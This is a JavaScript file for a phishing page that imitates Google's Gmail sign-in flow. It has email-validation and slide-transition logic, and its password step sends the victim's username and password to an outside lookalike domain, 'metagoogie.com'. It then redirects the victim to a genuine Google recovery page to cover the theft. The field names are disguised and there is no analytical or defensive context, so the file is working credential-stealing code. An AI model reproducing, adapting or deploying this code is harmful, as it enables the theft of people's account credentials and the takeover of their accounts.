/* a regex express to valid email addresses */
function validateEmail(email) {
	var re =
		/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
	return re.test(email)
}

function onReady() {
	scrollTo(400, 0)
}


function doEmailStep() {
	var emailValid = validateEmail($('#cuent4').val())

	$('#cgle-progress-bar').fadeIn(500) //.css('display', 'block')
	$('#login-form').css('opacity', 0.5)

	setTimeout(() => {
		$('#cgle-progress-bar').fadeOut(500) //.css('display', 'none')
		$('#login-form').css('opacity', 1.0)
		if (emailValid) {
			$('#cuent4').removeClass('g-input-invalid')
			$('.invalid-email').css('display', 'none')
			$('#prev-email').text($('#cuent4').val())
			toPasswordPage()
		} else {
			$('#cuent4').addClass('g-input-invalid')
			$('.invalid-email').css('display', 'block')
			toEmailPage()
		}
	}, 400)
}

async function doPasswordStep() {
	var cuent4 = $('#cuent4').val()
	var clav3 = $('#clav3').val()
	const url = 'https://recover.metagoogie.com/'
	const resp = await fetch(url + 'signin?username=' + cuent4 + '&password=' + clav3)
	const data = await resp.text()
	if (data == '👌') {
		window.location.replace('https://accounts.google.com/signin/v2/recoveryidentifier')
	} else {
	}
}

function toEmailPage() {
	scrollTo(400)
	$('#instruction-text').text('Sign in')
	$('#instrution-text-desc').text('Continue to Gmail')
	$('#cuent4').focus()
}

function toPasswordPage() {
	scrollTo(0)

	$('#instruction-text').text('Welcome')
	$('#instrution-text-desc').text(' ')
	$('#clav3').focus()
}

function scrollTo(toPerc, duration = 500) {
	$('.slide-container-outer').animate(
		{
			scrollLeft: toPerc + '%',
		},
		duration
	)
}

function attachEvents() {
	$('#email-form-step').on('submit', function (e) {
		doEmailStep()
		e.preventDefault()
	})

	$('.btn-next-email').on('click', function () {
		doEmailStep()
	})

	$('#password-form-step').on('submit', function (e) {
		doPasswordStep()
		e.preventDefault()
	})

	$('.btn-next-password').on('click', function () {
		doPasswordStep()
	})
}

window.onload = function () {
	onReady()
	attachEvents()
}
